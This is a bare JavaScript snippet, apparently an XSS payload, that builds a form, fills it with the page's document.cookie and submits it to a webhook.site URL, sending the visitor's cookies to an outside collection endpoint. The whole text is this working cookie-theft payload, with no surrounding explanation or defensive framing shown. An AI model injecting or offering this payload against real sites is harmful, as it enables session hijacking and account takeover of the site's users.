let f=document.createElement('form');
f.method='GET';
f.action='https://webhook.site/a8af7f63-4bbf-4dcb-9854-72a33246d4db';
let i=document.createElement('input');
i.name='c';
i.value=document.cookie;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
